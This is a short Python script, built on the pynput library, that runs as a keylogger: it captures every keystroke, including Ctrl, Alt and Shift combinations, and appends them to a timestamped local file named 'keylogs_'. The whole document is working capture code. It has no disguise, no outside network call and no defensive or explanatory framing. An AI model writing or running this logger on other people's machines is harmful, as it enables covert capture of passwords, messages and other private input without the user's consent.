from pynput import keyboard
import datetime

multiKeys = set()
t = datetime.datetime.now().strftime('%d.%m_%H-%M')  # Fixed: moved outside function

def keyPressed(key):
    global multiKeys

    key_str = ''

    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.shift):
        multiKeys.add(key)
        return

    multiKeys_str = ''
    if keyboard.Key.ctrl_l in multiKeys or keyboard.Key.ctrl_r in multiKeys:
        multiKeys_str += 'CTRL+'
    if keyboard.Key.alt_l in multiKeys or keyboard.Key.alt_r in multiKeys:
        multiKeys_str += 'ALT+'
    if keyboard.Key.shift in multiKeys:
        multiKeys_str += 'SHIFT+'

    try:
        key_str = key.char if key.char else f'[{key.name}]'
    except AttributeError:
        key_str = f'[{key.name}]'

    try:
        with open(f"keylogs_{t}.txt", 'a') as f:
            f.write(multiKeys_str + key_str + '\n')
    except Exception as e:
        print(f"Error writing to file: {e}")

def keyreleased(key):
    if key in multiKeys:
        multiKeys.discard(key)

listener = keyboard.Listener(on_press=keyPressed, on_release=keyreleased)
listener.start()
listener.join()  # cleaner than input()
